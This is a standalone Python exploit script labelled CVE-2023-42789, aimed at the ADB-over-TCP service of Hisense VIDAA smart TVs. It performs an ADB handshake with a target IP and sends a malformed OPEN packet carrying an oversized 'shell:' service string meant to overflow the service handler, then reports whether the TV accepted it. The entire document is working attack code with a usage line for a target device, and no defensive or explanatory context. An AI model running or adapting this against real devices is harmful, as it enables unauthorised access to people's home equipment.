#!/usr/bin/env python3
"""CVE-2023-42789 — Hisense VIDAA ADB. ADB-over-TCP with a malformed OPEN
service string that escapes the shell service handler."""
import socket, struct, sys

ADB_VERSION = 0x01000001; ADB_MAXDATA = 256 * 1024
ADB_BANNER = b"host::features=shell_v2,cmd,stat_v2"
CMD_CNXN = 0x4E584E43; CMD_OPEN = 0x4E45504F; CMD_OKAY = 0x59414B4F; CMD_WRTE = 0x45545257

def pack(cmd, a0, a1, d=b""):
    return struct.pack("<IIIIII", cmd, a0, a1, len(d), sum(d) & 0xFFFFFFFF,
                       cmd ^ 0xFFFFFFFF) + d

def _exact(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError
        b += c
    return b

def recv(s):
    c, a0, a1, ln, _, _ = struct.unpack("<IIIIII", _exact(s, 24))
    return c, a0, a1, (_exact(s, ln) if ln else b"")

def exploit(host, port=5555):
    s = socket.create_connection((host, port), timeout=8)
    s.sendall(pack(CMD_CNXN, ADB_VERSION, ADB_MAXDATA, ADB_BANNER))
    for _ in range(6):
        c, a0, a1, d = recv(s)
        if c == CMD_CNXN: break
    # oversized service name -> handler lookup overflow
    svc = b"shell:" + b"x" * 1024 + b"\x00"
    s.sendall(pack(CMD_OPEN, 1, 32 * 1024 * 1024, svc))
    c, a0, a1, d = recv(s)
    print(f"[+] CVE-2023-42789 OPEN -> {'OKAY' if c == CMD_OKAY else hex(c)}")
    s.close()
    return c == CMD_OKAY

def main():
    if len(sys.argv) > 1: exploit(sys.argv[1])
    else: print("usage: cve_2023_42789_hisense_adb.py <tv-ip> [port]")

if __name__ == "__main__":
    main()
